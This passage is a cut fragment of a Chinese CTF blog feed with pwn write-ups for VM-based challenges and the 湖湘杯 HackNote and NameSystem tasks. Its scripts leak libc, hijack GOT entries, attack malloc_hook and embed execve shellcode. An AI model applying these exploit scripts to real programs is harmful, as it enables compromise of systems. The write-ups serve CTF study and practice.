class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">exec_file=<span class="string">"./RHVM.bin"</span></span><br><span class="line">context.binary=exec_file</span><br><span class="line"><span class="comment">#context.terminal=["tmux","splitw","-h"]</span></span><br><span class="line">elf=ELF(exec_file,checksec = <span class="literal">False</span>)</span><br><span class="line"><span class="keyword">if</span> local :</span><br><span class="line">    a=process(exec_file)</span><br><span class="line">    <span class="keyword">if</span> context.arch == <span class="string">"i386"</span> :</span><br><span class="line">        libc=ELF(<span class="string">"/lib/i386-linux-gnu/libc.so.6"</span>,checksec = <span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">elif</span> context.arch == <span class="string">"amd64"</span> :</span><br><span class="line">        libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>,checksec = <span class="literal">False</span>) </span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    a=remote(<span class="string">""</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_base</span><span class="params">(a)</span>:</span></span><br><span class="line">    text_base = a.libs()[a._cwd+a.argv[<span class="number">0</span>].strip(<span class="string">'.'</span>)]</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> a.libs():</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"libc.so.6"</span> <span class="keyword">in</span> key:</span><br><span class="line">            <span class="keyword">return</span> text_base,a.libs()[key]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">    text_base,libc_base=get_base(a)</span><br><span class="line">    script=<span class="string">"set $text_base="</span>+str(text_base)+<span class="string">'\n'</span>+<span class="string">"set $libc_base="</span>+str(libc_base)+<span class="string">'\n'</span></span><br><span class="line">    script+=<span class="string">'''</span></span><br><span class="line"><span class="string">    set $reg = ($text_base+0x0000000000203060)</span></span><br><span class="line"><span class="string">    b *($text_base+0x0000000000001B15)</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    gdb.attach(a,script)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuck</span><span class="params">(address)</span>:</span></span><br><span class="line">    n = globals()</span><br><span class="line">    <span class="keyword">for</span> key,value <span class="keyword">in</span> n.items():</span><br><span class="line">        <span class="keyword">if</span> value == address:</span><br><span class="line">            <span class="keyword">return</span> success(key+<span class="string">"  ==&gt;  "</span>+hex(address))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">opcode</span><span class="params">(op,idx1,idx2)</span>:</span></span><br><span class="line">    p = (op&lt;&lt;<span class="number">16</span>) | (idx1&lt;&lt;<span class="number">8</span>) | idx2 </span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Init</span><span class="params">(len)</span>:</span></span><br><span class="line">    a.sendlineafter(<span class="string">"EIP: "</span>,<span class="string">"0"</span>)</span><br><span class="line">    a.sendlineafter(<span class="string">"ESP: "</span>,<span class="string">"0"</span>)</span><br><span class="line">    a.sendlineafter(<span class="string">"Give me code length: \n"</span>,str(len))</span><br><span class="line">    a.recvuntil(<span class="string">"Give me code: \n"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Read</span><span class="params">(idx1,value)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> opcode(<span class="number">0x40</span>,idx1,value)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">MovDataToReg</span><span class="params">(idx1,idx2)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> opcode(<span class="number">0x42</span>,idx1,idx2)<span class="comment">#reg[reg[idx1]] = data[reg[idx2]]</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">MovRegToData</span><span class="params">(idx1,idx2)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> opcode(<span class="number">0x41</span>,idx1,idx2)<span class="comment">#data[reg[idx1]] = reg[idx2]</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">SubReg</span><span class="params">(idx1,idx2)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> opcode(<span class="number">0xd0</span>,idx1,idx2)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AddReg</span><span class="params">(idx1,idx2)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> opcode(<span class="number">0xa0</span>,idx1,idx2)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">LeftShift</span><span class="params">(idx1,idx2)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> opcode(<span class="number">0xe0</span>,idx1,idx2)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">PushReg</span><span class="params">(idx)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> opcode(<span class="number">0x70</span>,<span class="number">0</span>,idx)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">PopReg</span><span class="params">(idx)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> opcode(<span class="number">0x80</span>,<span class="number">0</span>,idx)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">MulReg</span><span class="params">(idx1,idx2)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> opcode(<span class="number">0xc0</span>,idx1,idx2)</span><br><span class="line">payload = [</span><br><span class="line"></span><br><span class="line">    Read(<span class="number">1</span>,<span class="number">8</span>),<span class="comment"># reg[1] = 12</span></span><br><span class="line">    Read(<span class="number">2</span>,<span class="number">1</span>),</span><br><span class="line">    SubReg(<span class="number">0</span>,<span class="number">1</span>),<span class="comment"># reg[0] = 0-8=-4</span></span><br><span class="line">    SubReg(<span class="number">0</span>,<span class="number">1</span>),<span class="comment"># reg[0] = -16</span></span><br><span class="line">    Read(<span class="number">3</span>,<span class="number">4</span>),<span class="comment">#reg[3] = 4</span></span><br><span class="line">    MovDataToReg(<span class="number">3</span>,<span class="number">0</span>),<span class="comment"># reg[4] = data[-16]</span></span><br><span class="line">    AddReg(<span class="number">0</span>,<span class="number">2</span>),<span class="comment">#reg[0] = -15</span></span><br><span class="line">    AddReg(<span class="number">3</span>,<span class="number">2</span>),<span class="comment">#reg[3] = 5</span></span><br><span class="line">    MovDataToReg(<span class="number">3</span>,<span class="number">0</span>), <span class="comment"># get stderr addr</span></span><br><span class="line">    Read(<span class="number">6</span>,<span class="number">5</span>),<span class="comment">#reg[6] = 5</span></span><br><span class="line">    Read(<span class="number">7</span>,<span class="number">8</span>),</span><br><span class="line">    AddReg(<span class="number">7</span>,<span class="number">2</span>),<span class="comment">#reg[7]= 9</span></span><br><span class="line">    LeftShift(<span class="number">6</span>,<span class="number">7</span>),</span><br><span class="line">    AddReg(<span class="number">7</span>,<span class="number">1</span>),</span><br><span class="line">    SubReg(<span class="number">7</span>,<span class="number">2</span>),</span><br><span class="line">    SubReg(<span class="number">7</span>,<span class="number">2</span>),</span><br><span class="line">    Read(<span class="number">1</span>,<span class="number">5</span>),</span><br><span class="line">    LeftShift(<span class="number">7</span>,<span class="number">1</span>),</span><br><span class="line">    Read(<span class="number">1</span>,<span class="number">8</span>),</span><br><span class="line">    AddReg(<span class="number">7</span>,<span class="number">1</span>),</span><br><span class="line">    AddReg(<span class="number">7</span>,<span class="number">1</span>),</span><br><span class="line">    AddReg(<span class="number">6</span>,<span class="number">7</span>),</span><br><span class="line">    SubReg(<span class="number">4</span>,<span class="number">6</span>),<span class="comment"># ==&gt; stdin.fileno</span></span><br><span class="line">    SubReg(<span class="number">3</span>,<span class="number">2</span>),</span><br><span class="line">    SubReg(<span class="number">4</span>,<span class="number">3</span>),<span class="comment"># ==&gt; stdin.fileno-4</span></span><br><span class="line">    AddReg(<span class="number">0</span>,<span class="number">1</span>),<span class="comment">#reg[0] = -15+8 = -7</span></span><br><span class="line">    SubReg(<span class="number">0</span>,<span class="number">2</span>),<span class="comment">#reg[0] = -8</span></span><br><span class="line">    SubReg(<span class="number">0</span>,<span class="number">2</span>),<span class="comment">#reg[0] = -9</span></span><br><span class="line">    MovRegToData(<span class="number">0</span>,<span class="number">5</span>),</span><br><span class="line">    SubReg(<span class="number">3</span>,<span class="number">2</span>),<span class="comment">#reg[3] = 4</span></span><br><span class="line">    SubReg(<span class="number">0</span>,<span class="number">2</span>),<span class="comment">#reg[0] = -10</span></span><br><span class="line">    MovRegToData(<span class="number">0</span>,<span class="number">4</span>),</span><br><span class="line">    MulReg(<span class="number">1</span>,<span class="number">1</span>),</span><br><span class="line">    AddReg(<span class="number">1</span>,<span class="number">3</span>),</span><br><span class="line">    AddReg(<span class="number">1</span>,<span class="number">7</span>),</span><br><span class="line">    PushReg(<span class="number">1</span>)<span class="comment"># fileno ==&gt; 0x233</span></span><br><span class="line">]</span><br><span class="line"><span class="keyword">print</span> len(payload)</span><br><span class="line">Init(len(payload))</span><br><span class="line">debug()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">    a.sendline(str(i))</span><br><span class="line">a.interactive()</span><br></pre></td></tr></table></figure><h2><span id="0x02-粤湾银行">0x02 粤湾银行</span></h2><p>这是一道32位的pwn,比赛的时候没逆清楚，赛后复现出来了。</p><p>开启保护：</p><pre><code>Arch:     i386-32-littleRELRO:    Partial RELROStack:    Canary foundNX:       NX enabledPIE:      No PIE (0x8048000)</code></pre><p>该题的结构体</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">00000000 </span>Vminfo          struc ; (sizeof=<span class="number">0</span>x2C)</span><br><span class="line"><span class="symbol">00000000 </span>reg             dd <span class="number">6</span> dup(?)</span><br><span class="line"><span class="symbol">00000018 </span>_ESP            dd ?</span><br><span class="line"><span class="number">0000001</span>C _EBP            dd ?</span><br><span class="line"><span class="symbol">00000020 </span>_EIP            dd ?</span><br><span class="line"><span class="symbol">00000024 </span>field_24        dd ?</span><br><span class="line"><span class="symbol">00000028 </span>stack_ptr       dd ?</span><br><span class="line"><span class="number">0000002</span>C Vminfo          ends</span><br></pre></td></tr></table></figure><p>这一题用到了三个指令。这一题有三个指令可以达到任意地址读写。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">movimm</span><span class="params">(reg,imm)</span>:</span><span class="comment">#将立即数放到任意寄存器</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">'\x03'</span>+p8(reg)+p32(imm)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">putchar</span><span class="params">()</span>:</span><span class="comment">#打印出reg[3]地址上的一个字节</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">'\x10'</span>+<span class="string">'\x01'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getchar</span><span class="params">()</span>:</span><span class="comment">#写一个字节到reg[3]存放的地址上</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">'\x10'</span>+<span class="string">'\x00'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addreg</span><span class="params">(reg)</span>:</span><span class="comment">#将任意寄存器的值加一</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">'\x20'</span>+p8(reg)</span><br></pre></td></tr></table></figure><p>通过上面四条指令可以达到任意地址的读写</p><p>我的思路是首先将got表泄露出来，然后劫持free的got表，从而达到getshell</p><p>当然，VM是很灵活的解题，解题思路不止一种，因为我只用到了他为数不多的几个指令，还有其他完全不同的思路解题。这就是我喜欢VM的原因，全靠自己逆向，自己的自由度很高，这一题还有一种思路就是通过寄存器的越界读写，修改存放栈的地址，改为got表，也能达到劫持got表的目的，这个想法应该是可行的，就和第一道题的思路类似。</p><p>我的exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">"./pwn3"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">    script=<span class="string">'''</span></span><br><span class="line"><span class="string">    b *0x80489A3</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    gdb.attach(p,script)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;&gt; "</span>,<span class="string">'1'</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">play</span><span class="params">()</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;&gt; "</span>,<span class="string">'2'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">()</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;&gt; "</span>,<span class="string">'3'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">movimm</span><span class="params">(reg,imm)</span>:</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">'\x03'</span>+p8(reg)+p32(imm)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">putchar</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">'\x10'</span>+<span class="string">'\x01'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getchar</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">'\x10'</span>+<span class="string">'\x00'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addreg</span><span class="params">(reg)</span>:</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">'\x20'</span>+p8(reg)</span><br><span class="line"></span><br><span class="line">payload=movimm(<span class="number">3</span>,<span class="number">0x0804B014</span>)+putchar()+addreg(<span class="number">3</span>)+putchar()+addreg(<span class="number">3</span>)+putchar()+addreg(<span class="number">3</span>)+putchar()</span><br><span class="line">payload+=<span class="string">'\xb0'</span></span><br><span class="line"><span class="keyword">print</span> payload</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">new(payload)</span><br><span class="line">play()</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">printf_addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line">free()</span><br><span class="line">libc=LibcSearcher(<span class="string">"printf"</span>,printf_addr)</span><br><span class="line">system_addr=printf_addr-libc.dump(<span class="string">"printf"</span>)+libc.dump(<span class="string">"system"</span>)</span><br><span class="line">payload=movimm(<span class="number">0</span>,u32(<span class="string">'sh\x00\x00'</span>))+movimm(<span class="number">3</span>,<span class="number">0x804B018</span>)+getchar()+addreg(<span class="number">3</span>)+getchar()+addreg(<span class="number">3</span>)+getchar()+addreg(<span class="number">3</span>)+getchar()+<span class="string">'\xb0'</span></span><br><span class="line">new(payload)</span><br><span class="line">play()</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.send(p32(system_addr)[<span class="number">0</span>])</span><br><span class="line">p.send(p32(system_addr)[<span class="number">1</span>])</span><br><span class="line">p.send(p32(system_addr)[<span class="number">2</span>])</span><br><span class="line">p.send(p32(system_addr)[<span class="number">3</span>])</span><br><span class="line">free()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>关于怎么防守，说实话，我是没怎么想清楚怎么去防守。因为利用点太多了，真的很困难。</p><h2><span id="0x03-粤湾证券">0x03 粤湾证券</span></h2><p>这道题是一个攻守兼备的一个VM，根据他提供的VM 来进行逆向分析他的指令集，然后再通过你提供的defense脚本和payload来进行一个攻守兼备的一个模式。</p><p>首先看一下这一题开启的保护</p><pre><code>Arch:     amd64-64-littleRELRO:    Full RELROStack:    Canary foundNX:       NX enabledPIE:      PIE enabled</code></pre><p>这一道题很无脑，因为它调用了dlsym,通过这个函数可以直接调用system。不过当时在现场不太了解这个函数，并且没有外网环境，并不知道这个函数用法。对这个函数进行盲测花了很长时间导致其他题没时间做了。这个函数把libc当做handle,第二参数为函数名称的字符串，就会返回函数的真实地址。所以这道题一点都不难，不过可惜在于当时一直以为是函数在libc的偏移量作为函数第二个参数，返回函数真实地址。</p><p>我的exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">"./pwn2"</span>)</span><br><span class="line"><span class="comment">#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")</span></span><br><span class="line"><span class="comment">#p=remote("172.16.9.41",9002)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(code)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"Give me code:"</span>,base64.b64encode(code))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"gift:0x"</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">gift=int(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="string">"gift====&gt;0x%x"</span>%gift)</span><br><span class="line">code=p64(<span class="number">0x10</span>)+p64(<span class="number">0</span>)+p64(gift+<span class="number">0x0001B3E9A</span>)+p64(<span class="number">0x40</span>)+p64(u64(<span class="string">'system'</span>.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)))+p64(gift+<span class="number">0x0001B3E9A</span>)</span><br><span class="line">new(code)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>我的编写defense的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"/defense"</span>,<span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(p64(<span class="number">0x20</span>)+p64(u64(<span class="string">'system'</span>.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)))+p64(u64(<span class="string">'system'</span>.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))))</span><br></pre></td></tr></table></figure><p>个人觉得，这个题是最好玩的一个题，希望以后的比赛多来点这种题。不是因为简单，而是因为这个题这种攻守兼备的模式。以题目作为媒介，自己编写攻击和防御脚本来进行对抗，这一点我特别喜欢。不像传统的AWD，通过去修改文件，来修复漏洞，那样少了许多攻击灵活性，但是也不像前道VM题攻击的那么灵活，让你修的无法下手，增加了许多防守的稳定性。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近做了vm的pwnt题才发现Vm的pwn题是真的有意思，做vm的关键在于逆向，我的逆向太菜了，逆的太慢了，做题速度直接与逆向速度挂钩，导致就做出来一道题，哭了。随便提一句有的没的，广州是真的好，主办方是我见过最良心的主办方，大气+多金。还有一道关于json的pwn,我实在
      
    
    </summary>
    
    
      <category term="Writeup" scheme="http://Whali3n51.top/categories/Writeup/"/>
    
      <category term="赛题复现" scheme="http://Whali3n51.top/categories/Writeup/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="VMpwn" scheme="http://Whali3n51.top/tags/VMpwn/"/>
    
  </entry>
  
  <entry>
    <title>湖湘杯线上赛pwn_wp</title>
    <link href="http://whali3n51.top/2019/11/11/%E6%B9%96%E6%B9%98%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwn_wp/"/>
    <id>http://whali3n51.top/2019/11/11/%E6%B9%96%E6%B9%98%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwn_wp/</id>
    <published>2019-11-11T06:14:00.000Z</published>
    <updated>2020-03-29T13:54:47.641Z</updated>
    
    <content type="html"><![CDATA[<p>难度刚刚好，我能做出来，但是又不是那么容易做出来。最后可惜，没能进线下，ak了pwn也无济于事。</p><h2><span id="0x01-hacknote">0x01 Hacknote</span></h2><p>静态编译的一个题，没开pie，没开nx,可以getshell，漏洞就是off-by-one,比赛的时候巨鸡儿坑，坑死我了，第一次的附件chunk是存在bss段的,然后我就想了个简单的办法，直接用unlink的方式做，但是尼玛服务器上面的程序chunk指针不是在bss段上，而是在栈上。当我发现的时候我简直无语了。最后附件更新四五次，浪费我大量时间在这上面。最后getshell的办法就是利用off-by-one造成堆块重叠，利用fast bin attack，攻击malloc_hook,攻击的时候，修改malloc_hook指向malloc_hook地址的随后的八个字节，修改的同时，在malloc_hook后面写上shellcode。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process("./HackNote")</span></span><br><span class="line">p=remote(<span class="string">"183.129.189.62"</span>,<span class="number">16804</span>)</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size,content)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"4. Exit\n"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"-----------------\n"</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Input the Size:\n"</span>,str(size))</span><br><span class="line">p.sendafter(<span class="string">"Input the Note:\n"</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"4. Exit\n"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"-----------------\n"</span>,<span class="string">'2'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Input the Index of Note:\n"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"4. Exit\n"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"-----------------\n"</span>,<span class="string">'3'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Input the Index of Note:\n"</span>,str(index))</span><br><span class="line">p.sendafter(<span class="string">"Input the Note:\n"</span>,content)</span><br><span class="line">create(<span class="number">0xf8</span>,<span class="string">'a'</span>+<span class="string">'\n'</span>)</span><br><span class="line">create(<span class="number">0x38</span>,<span class="string">'a'</span>+<span class="string">'\n'</span>)</span><br><span class="line">create(<span class="number">0x20</span>,<span class="string">'a'</span>+<span class="string">'\n'</span>)</span><br><span class="line">create(<span class="number">0xf8</span>,<span class="string">'a'</span>+<span class="string">'\n'</span>)</span><br><span class="line">create(<span class="number">0x88</span>,<span class="string">'a'</span>*<span class="number">0x1</span>+<span class="string">'\n'</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="string">'a'</span>*<span class="number">0xf8</span>)</span><br><span class="line">create(<span class="number">0x20</span>,<span class="string">'\x00'</span>+<span class="string">'\n'</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0xf0</span>+p64(<span class="number">0x270</span>)+<span class="string">'\x90'</span></span><br><span class="line">edit(<span class="number">3</span>,payload)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">create(<span class="number">0xf8</span>,<span class="string">'a'</span>+<span class="string">'\n'</span>)</span><br><span class="line">create(<span class="number">0x38</span>,<span class="string">'a'</span>+<span class="string">'\n'</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0x6cb772</span>)+<span class="string">'\n'</span>)</span><br><span class="line">create(<span class="number">0x38</span>,<span class="string">'a'</span>+<span class="string">'\n'</span>)</span><br><span class="line">create(<span class="number">0x38</span>,<span class="string">'aaaaaa'</span>+p64(<span class="number">0x6cb790</span>)+<span class="string">"\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"</span>+<span class="string">'\x00\n'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">"4. Exit\n"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"-----------------\n"</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Input the Size:\n"</span>,str(<span class="number">23</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2><span id="0x02-namesystem">0x02 NameSystem</span></h2><p>这个题的漏洞如果不仔细看，是真的看不出来，在free的时候，将当前chunk指针清零，并将后面指针往迁移。如果粗略的看，这样是没有什么问题的。但是仔细思考，当我们堆块为满的时候，前面任何一个chunk的指针被清零后，最后的一个chunk会赋值前移，造成的效果就是第19和第20个的chunk值一模一样，这样就造成悬挂指针，也就是可以double free了。getshell的主要思路就是攻击got表和存放chunk指针的bss段来泄露lib和getshell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span 